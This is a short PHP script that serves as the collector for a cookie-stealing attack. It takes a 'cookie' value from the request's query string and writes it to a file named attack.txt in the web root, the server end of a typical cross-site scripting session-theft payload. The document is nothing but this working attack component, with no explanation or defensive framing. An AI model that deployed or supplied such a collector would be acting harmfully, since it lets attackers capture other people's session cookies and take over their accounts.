<?php
$cookie=$_GET[cookie];
$save_file=fopen("/var/www/html/attack.txt","w");
fwrite($save_file,$cookie);
fclose($save_file);
?>
